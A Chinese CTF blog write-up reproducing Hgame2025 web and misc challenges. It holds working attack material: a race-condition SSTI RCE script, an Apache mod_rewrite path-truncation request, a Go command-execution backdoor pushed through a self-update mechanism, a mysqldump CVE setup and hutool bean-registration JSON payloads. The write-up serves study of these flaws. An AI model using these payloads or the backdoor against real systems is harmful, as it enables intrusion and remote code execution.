---
title: Hgame2025 部分赛题复现
categories:
- CTF
tag:
- CTF
- web
- misc
- WriteUp
date: 2025-03-02 20:58:51
excerpt: 尽力了......
index_img: /img/Hgame2025复现/Hgame2025.jpg
banner_img: /img/Hgame2025复现/Hgame2025.jpg
---

# Hgame2025 部分赛题复现

# Week1

## Web

### Level 24 Pacman

这道题做出来了，但是有更简单的方法

游戏失败一次后即可得到一个“gift”，经过 base64+ 栅栏密码解密得到一个假的 flag

![](/img/Hgame2025复现/BofvbORQ6oUhCQxTMj9cPzopnTb.png)

flag 是在游戏通关后给出，那么就完全可能在 js 源码里找到 flag 相关的字符串。这里可以结合关键字“gift”进行搜索，发现了另一个不同的“gift”，同样的方式解密即可得到 flag

![](/img/Hgame2025复现/BNAgbjD1To2lnSxWGoecxrJinbh.png)

### Level 38475 角落

用 dirsearch 目录扫描可以发现 robots.txt，其中有敏感信息 app.conf

![](/img/Hgame2025复现/MvOVbVXGJoePSpxLGPfcK7PBnsb.png)

![](/img/Hgame2025复现/VMBpb2SYgooQXoxMcPYcBhWgnFc.png)

从中可以拿到 app.py 的绝对路径，再利用 rewrite 来读⽂件，做题时未能联想到这一点，也不了解 CVE-2024-38475，只是用 `L1nk/` 开头的 `user-agent` 扫描爆破，所以未能找到任何有效信息。

研读一下参考资料：https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/ 可知，Apache 的 mod_rewrite 允许网站管理员透过 RewriteRule 语法轻松的将路径透过指定的规则改写：

```apache
RewriteRule Pattern Substitution [flags]
```

其中目标可以是一个档案系统路径或是一个网址，在改写路径时，mod_rewrite 会强制把结果视为网址处理(splitout_queryargs())，这导致了在 HTTP 请求中可以透过一个问号 `%3F` 去截断 RewriteRule 后面的路径或网址，从而引出了路径截断和误导 RewriteFlag 的设置两种攻击方式，本题涉及的应该是前者。

所以访问 `/admin/usr/local/apache2/app/app.py%3f` 可以截断后面的内容读取到 app.py 的源码

![](/img/Hgame2025复现/JOdwb24EQoAMlExvZLbcSI3dnEh.png)

```python
from flask import Flask, request, render_template, render_template_string, redirect
import os
import templates

app = Flask(__name__)
pwd = os.path.dirname(__file__)
show_msg = templates.show_msg


def readmsg():
        filename = pwd + "/tmp/message.txt"
        if os.path.exists(filename):
                f = open(filename, 'r')
                message = f.read()
                f.close()
                return message
        else:
                return 'No message now.'


@app.route('/index', methods=['GET'])
def index():
        status = request.args.get('status')
        if status is None:
                status = ''
        return render_template("index.html", status=status)


@app.route('/send', methods=['POST'])
def write_message():
        filename = pwd + "/tmp/message.txt"
        message = request.form['message']

        f = open(filename, 'w')
        f.write(message) 
        f.close()

        return redirect('index?status=Send successfully!!')
        
@app.route('/read', methods=['GET'])
def read_message():
        if "{" not in readmsg():
                show = show_msg.replace("{{message}}", readmsg())
                return render_template_string(show)
        return 'waf!!'
        

if __name__ == '__main__':
        app.run(host = '0.0.0.0', port = 5000)
```

从源码中可以发现，留言板发送的信息会写入 `/tmp/message.txt` 中，存在 `/read` 路由也就是 `/app/read` 可以读取留言板发送的信息 `/tmp/message.txt` 并直接渲染在模版中返回，但前提是不能包含 `{`，否则返回 `'waf!!'`。那么可以考虑通过 SSTI 实现 RCE，通过条件竞争来绕过 if 判断语句。

![](/img/Hgame2025复现/FL8cbf8bsouurhxDsZecOlxjnXb.png)

![](/img/Hgame2025复现/P6WBbbBNdobRqsxSv5BcnszUndh.png)

先自己写个脚本试一下，对写入和读取过程进行条件竞争，在前一次读取文件无 `{` 通过 if 判断后、后一次读取文件传入 show 渲染前，写入目标语句 `{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}`，实现 RCE

```python
import threading
import requests

def send_():
    data={"message": "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"}
    res=requests.post("http://node1.hgame.vidar.club:30668/app/send",data=data)
def read_():
    res=requests.get("http://node1.hgame.vidar.club:30668/app/read")
    print(res.text)
threads=[]
for i in range(15):
    thread1=threading.Thread(target=send_)
    thread2=threading.Thread(target=read_)
    #这里当时遇到了一个问题，我写的是target=send_()那么实际为立即执行，两个函数为顺序执行，无法实现条件竞争
    #正确的应该是target=send_，多线程完成请求
    threads.append(thread1)
    threads.append(thread2)
    thread1.start()
    thread2.start()
for t in threads:
    t.join()
```

![](/img/Hgame2025复现/ACwSbqbhdoseXcxAGdTc8fsOnyh.png)

官方 WP 所给脚本

```python
import requests 
import threading 
url = 'http://node1.hgame.vidar.club:32737/' 
data = { 
    "messgae": "", 
    } 
def write_msg(i): 
    data["message"] = "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"+str(i) 
    r = requests.post(url + '/app/send', data=data) 
def read_msg(i): 
    r = requests.get(url + '/app/read') 
    print(i, "read", r.text) 
    if "Latest" in r.text: 
        print(r.text) 
        exit() 
threads = [] 
for i in range(10): 
    thread = threading.Thread(target=write_msg, args=(i,)) 
    threads.append(thread) 
    thread.start() 
    thread = threading.Thread(target=read_msg, args=(i,)) 
    threads.append(thread) 
    thread.start() 
for thread in threads: 
    thread.join()
```

### Level 25 双面人派对

比赛的时候不熟悉 IDA 且未及时购买第二个提示，且末尾心态有些急，成功脱壳后没找到配置的内容，导致即便知道了后续的解题思路也无从下手 [https://baimeow.cn/posts/ctf/d3go/](https://baimeow.cn/posts/ctf/d3go/)。重新检索了一下 IDA 相关用法，通过查找所有字符串找到了这段配置

![](/img/Hgame2025复现/FMFHbGvd5oHP6QxfeMRcFt6Sn1g.png)

```go
minio: 
    endpoint: "127.0.0.1:9000" 
    access_key: "minio_admin" 
    secret_key: "JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=" 
    bucket: "prodbucket" 
    key: "update"
```

使用 minio client 连接靶机（题目给的第一个地址）获取源码 src.zip

![](/img/Hgame2025复现/HXSJb1TA3oJYHOxAERdcNhQDn7c.png)

main.go 源码

```go
package main

import (
    "level25/fetch"

    "level25/conf"

    "github.com/gin-gonic/gin"
    "github.com/jpillora/overseer"
)

func main() {
    fetcher := &fetch.MinioFetcher{
        Bucket:    conf.MinioBucket,
        Key:       conf.MinioKey,
        Endpoint:  conf.MinioEndpoint,
        AccessKey: conf.MinioAccessKey,
        SecretKey: conf.MinioSecretKey,
    }
    overseer.Run(overseer.Config{
        Program: program,
        Fetcher: fetcher,
    })

}

func program(state overseer.State) {
    g := gin.Default()
    g.StaticFS("/", gin.Dir(".", true))
    g.Run(":8080")
}
```

从源码和[提示](https://baimeow.cn/posts/ctf/d3go/)结合对 overseer 的搜索可以发现使用了 overseer 对程序热加载，文件变更后会自动重启更新，解题思路也就是从自更新入手打 RCE。

那么先在本地修改 main.go 文件，注释掉原有的静态⽂件托管，写入 WP 所给后门

```go
func program(state overseer.State) {
        g := gin.Default()
        // g.StaticFS("/", gin.Dir(".", true))
        g.GET("/shell", func(c *gin.Context) {
                cmd, _ := c.GetQuery("cmd")
                out, err := exec.Command("bash", "-c", cmd).CombinedOutput()
                if err != nil {
                        c.String(500, err.Error())
                        return
                }
                c.String(200, string(out))
        })
        g.Run(":8080")
}
```

然后使用 `go build -o update` 编译文件为 update（源文件名）

再上传覆盖原文件 `mc cp ./update ctf-minio/prodbucket/update`

![](/img/Hgame2025复现/QpU4boPRwoAChXxDxCKcqBfende.png)

等自更新完成后向靶机发送 get 请求 RCE，得到 flag（题目给的第二个地址）

![](/img/Hgame2025复现/Nf5Ub89nuodHNuxfPQ8cwEpdnEh.png)

参考：[https://infernity.top/2025/02/03/Hgame-2025-week1/#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9](https://infernity.top/2025/02/03/Hgame-2025-week1/#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9)

# Week2

## Web

### Level 21096 HoneyPot_Revenge

比赛时针对 mysqldump 尝试用网上找到的 mysql 协议伪造程序解题，但未能成功，也没有关注到 CVE-2024-21096 漏洞，看 WP 后问题确实在 mysqldump 上

参考 WP 和博客 https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/ 自行编译一个 mysql 服务进行复现：

先搭安装编译依赖

```shell
sudo apt-get update
sudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config
wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz
tar -zxvf mysql-boost-8.0.34.tar.gz
cd mysql-8.0.34
```

然后在 `mysql-8.0.34/include` 目录下找到 `mysql_version.h.in` 版本模板文件如下，对其进行修改

```sql
/* Copyright Abandoned 1996,1999 TCX DataKonsult AB & Monty Program KB
   & Detron HB, 1996, 1999-2004, 2007 MySQL AB.
   This file is public domain and comes with NO WARRANTY of any kind
*/

/* Version numbers for protocol & mysqld */

#ifndef _mysql_version_h
#define _mysql_version_h

#define PROTOCOL_VERSION            @PROTOCOL_VERSION@
#define MYSQL_SERVER_VERSION       "@VERSION@"
#define MYSQL_BASE_VERSION         "mysqld-@MYSQL_BASE_VERSION@"
#define MYSQL_SERVER_SUFFIX_DEF    "@MYSQL_SERVER_SUFFIX@"
#define MYSQL_VERSION_ID            @MYSQL_VERSION_ID@
#define MYSQL_PORT                  @MYSQL_TCP_PORT@
#define MYSQL_ADMIN_PORT            @MYSQL_ADMIN_TCP_PORT@
#define MYSQL_PORT_DEFAULT          @MYSQL_TCP_PORT_DEFAULT@
#define MYSQL_UNIX_ADDR            "@MYSQL_UNIX_ADDR@"
#define MYSQL_CONFIG_NAME          "my"
#define MYSQL_PERSIST_CONFIG_NAME  "mysqld-auto"
#define MYSQL_COMPILATION_COMMENT  "@COMPILATION_COMMENT@"
#define MYSQL_COMPILATION_COMMENT_SERVER  "@COMPILATION_COMMENT_SERVER@"
#define LIBMYSQL_VERSION           "@VERSION@"
#define LIBMYSQL_VERSION_ID         @MYSQL_VERSION_ID@

#ifndef LICENSE
#define LICENSE                     GPL
#endif /* LICENSE */

#endif /* _mysql_version_h */
```

修改该处即可 `#define MYSQL_SERVER_VERSION       "@VERSION@"`

![](/img/Hgame2025复现/AnMzbnkRcoHVpGxrVsIcVXzKnoh.png)

编译（很久，所以上一步修改需谨慎）

```shell
mkdir build     //在刚才的mysql目录下
cd build
cmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost
make -j$(nproc)
```

安装 MySQL `sudo make install`

创建⽤⼾组

```shell
sudo groupadd mysql 
sudo useradd -r -g mysql -s /bin/false mysql
```

数据库初始化

```shell
sudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data
```

并获得初始账号密码

![](/img/Hgame2025复现/SANWbY4RsoYGGJxvcKUcafWtnrd.png)

设置⽬录权限

```shell
sudo chown -R mysql:mysql /usr/local/mysql 
sudo chown -R mysql:mysql /usr/local/mysql/data
```

启动服务、使⽤记录的 root 密码登录

```shell
sudo /usr/local/mysql/bin/mysqld_safe --user=mysql &
/usr/local/mysql/bin/mysql -u root -p
```

重置密码并创建 test 库

```sql
ALTER USER 'root'@'localhost' IDENTIFIED BY 'password'; 
FLUSH PRIVILEGES; 
CREATE DATABASE test;
```

配置远程连接登录

```sql
use mysql;
update user set host = '%' where user = 'root';    ##改为**'%'**允许任何ip访问
select user,host from user;    ## 查看用户访问端口如下
FLUSH PRIVILEGES;    ## 刷新服务配置项
EXIT;
```

![](/img/Hgame2025复现/X79hbhJtZoMoFcxJia4cGV1Tngg.png)

查看 mysqldump 版本测试 `/usr/local/mysql/bin/mysql --version`，可以看到插入的命令

![](/img/Hgame2025复现/O07ab350LoC8euxB8VycO1hLnhf.png)

虚拟机配置桥接模式，与服务器通过 ssh 反向隧道构建端口映射

虚拟机上输入

`sudo ssh -fN -R （服务器端口）3306:localhost:3306（虚拟机端口） 服务器登录账户名@服务器公网ip`

虚拟机上可使用 `ps aux | grep "ssh -NfR"` 查看连接情况

![](/img/Hgame2025复现/KwjpbrjtmoAe6UxLaYHc0BwJnBh.png)

服务器上输入

```shell
vim /etc/ssh/sshd_config   #修改配置加上GatewayPorts yes语句允许反向隧道
sudo systemctl restart sshd   #重启 SSH 服务
ps aux | grep ssh    #查看SSH隧道状态
```

用主机尝试通过服务器 ip 登录 mysql，登录成功

![](/img/Hgame2025复现/FiYabpnbZoZL0FxZ8kucxrdsnsb.png)

导入靶机数据库

![](/img/Hgame2025复现/AwSJbc2CyogwkVxaKllconORnjd.png)

访问 `/flag`，发现成功 RCE，获得 flag

![](/img/Hgame2025复现/JZ5Ib5RCwo2F7VxYyOGcM0gsnlb.png)

参考：

[https://fanllspd.com/posts/cf41815c/#Level-21096-HoneyPot-Revenge](https://fanllspd.com/posts/cf41815c/#Level-21096-HoneyPot-Revenge)

[https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/](https://tech.ec3o.fun/2024/10/25/Web-Vulnerability)

[https://blog.csdn.net/INSBUG/article/details/142262709](https://blog.csdn.net/INSBUG/article/details/142262709)

### Level 60 SignInJava

赛时没做，现在再看看题目。下载附件，里面一个 SigninJava.jar，在 idea 里 Add as Library 添加为库即可查看源码（jar 文件当做压缩包即可），打开后文件结构如下，应该是用了 spring 框架 MVC 模式

![](/img/Hgame2025复现/DaIabKNmZoAX7sx9WGwcb1e0nVg.png)

其中 BaseResponse 规定了返回内容的格式，APIGatewayController 作为控制层规定了路由接口和接受请求后控制、调用的规则，HelloService 和 FlagTestService 处理逻辑业务，分别返回“hello xxx”和读取/flag，InvokeUtils 和 SpringContextHolder 作为工具或插件，前者可以调用指定 bean 和其指定方法并传入参数，后者可以方便地引用各种 bean 而不需要注入。

重点看 APIGatewayController 代码如下

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package icu.Liki4.signin.controller;

import cn.hutool.core.util.StrUtil;
import com.alibaba.fastjson2.JSON;
import icu.Liki4.signin.base.BaseResponse;
import icu.Liki4.signin.util.InvokeUtils;
import jakarta.servlet.http.HttpServletRequest;
import java.util.Map;
import java.util.Objects;
import org.apache.commons.io.IOUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
@RequestMapping({"/api"})
public class APIGatewayController {
    public APIGatewayController() {
    }

    @RequestMapping(
        value = {"/gateway"},
        method = {RequestMethod.POST}
    )
    @ResponseBody
    public BaseResponse doPost(HttpServletRequest request) throws Exception {
        try {
            String body = IOUtils.toString(request.getReader());
            Map<String, Object> map = (Map)JSON.parseObject(body, Map.class);
            String beanName = (String)map.get("beanName");
            String methodName = (String)map.get("methodName");
            Map<String, Object> params = (Map)map.get("params");
            if (StrUtil.containsAnyIgnoreCase(beanName, new CharSequence[]{"flag"})) {
                return new BaseResponse(403, "flagTestService offline", (Object)null);
            } else {
                Object result = InvokeUtils.invokeBeanMethod(beanName, methodName, params);
                return new BaseResponse(200, (String)null, result);
            }
        } catch (Exception var8) {
            Exception e = var8;
            return new BaseResponse(500, ((Throwable)Objects._requireNonNullElse_(e.getCause(), e)).getMessage(), (Object)null);
        }
    }
}
```

只开放了 `/api/gateway`，可以通过 post 方法 json 格式传递 `beanName`、`methodName`、`params`（Map 类型）三个参数，其中 `StrUtil.containsAnyIgnoreCase` 对 `beanName` 字符串检测是否含有 flag（不区分大小写，均过滤），若有则返回 `"flagTestService offline"`，若无则调用对应的 bean 中的方法，返回结果。

为了尝试调用 bean 先去了解了一下 Spring 注解自动生成的 Bean 的 name 属性命名规则，在类上加 `@``Component`、`@Repository`、`@Service`、`@Controller` 注解来定义 bean 时 spring 会自动生成 bean，如果不主动定义 bean 的 name 那么默认以类名称的首字母小写作为 bean 的 name 属性。例如 HelloService 类的 bean 就是 helloService。

尝试，得到预期返回

![](/img/Hgame2025复现/JFunbdQNBofvZJxJnIvcy1Qqnyg.png)

尝试调用 flagTestService 未能找到过滤绕过方法

于是尝试利用 SpringContextHolder，但只能获取实例，无法调用方法获取 flag

![](/img/Hgame2025复现/GOcibFNKUoAWUsxkJxAcNwgTnkd.png)

后面找不到可行的思路了，开始借鉴网上的博客和 WP，需要寻找其他 bean 可利用的类，然而我不知道他们是如何筛选出目标来的，只知道最终找到的是 hutool 的 RuntimeUtil 具有命令执行的方法，然而该类并没有被注册，所以命令执行前需要先用 hutool 里的注册 bean 的方法。（或许还与反序列化有关？此处并未搞懂）

![](/img/Hgame2025复现/AANIbGG8nonCiCxqc8ncKEC1n1f.png)

通过 hutool 的 SpringUtil 注册 hutool 的 RuntimeUtil

```
{
    "beanName":"cn.hutool.extra.spring.SpringUtil",
    "methodName":"registerBean",
    "params":{
        "arg0":"execCmd",
        "arg1":{
            "@type":"cn.hutool.core.util.RuntimeUtil"
        }
    }
}
```

![](/img/Hgame2025复现/Ez63bk1KioiOqOxZ7ajcgtAvnEd.png)

![](/img/Hgame2025复现/HUxQb0lwOo0cQjx06Kpca5WanZb.png)

调用 RuntimeUtil 的 execForStr 实现 RCE 获得 flag

```
{
    "beanName":"execCmd",
    "methodName":"execForStr",
    "params":{
        "arg0":"utf-8",
        "arg1":["/readflag"]
    }
}
```

![](/img/Hgame2025复现/PcAvbbEvXoBox9xRYWmcRUlHnSK.png)

参考：[https://www.n0o0b.com/archives/hgame2025-week2#level-60-signinjava](https://www.n0o0b.com/archives/hgame2025-week2#level-60-signinjava)

## Misc

### Computer cleaner plus

尝试过检索所有可执行文件、关键目录的查找、按关键字检索、alias 别名、查看进程、启动项、历史命令等等，但未找到恶意可执行文件。

官方 WP 给出的是 `rpm -Vf /usr/bin/*`，该指令可以用 rpm 验证 `/usr/bin/` 目录下所有文件所属的 RPM 软件包是否被修改，我去执行后可以发现 ps 相关内容经过修改

![](/img/Hgame2025复现/Ua8AbUFeso2cndxKo0fcaHJMnHb.png)

```
各字母含义如下：
S         文件大小是否改变
M         文件的类型或文件的权限（rwx）是否被改变
5         文件MD5校验是否改变（可以看成文件内容是否改变）
D         设备中，从代码是否改变
L         文件路径是否改变
U         文件的属主（所有者）是否改变
G         文件的属组是否改变
T         文件的修改时间是否改变
```

说明 ps 文件的大小、权限、内容、修改时间均发生变化，下面还有多处

所以查看 ps 文件，发现可疑 elf 文件即为 flag

![](/img/Hgame2025复现/QJxWbFdjSoHCjFxDST7c0zJVnKb.png)

这里修改后的命令运行了后门程序 `B4ck_D0_oR.elf`，然后调用 `/.hide_command` 下的 ps 命令，再过滤了包含 `shell` 和 `B4ck_D0_oR` 的相关内容。
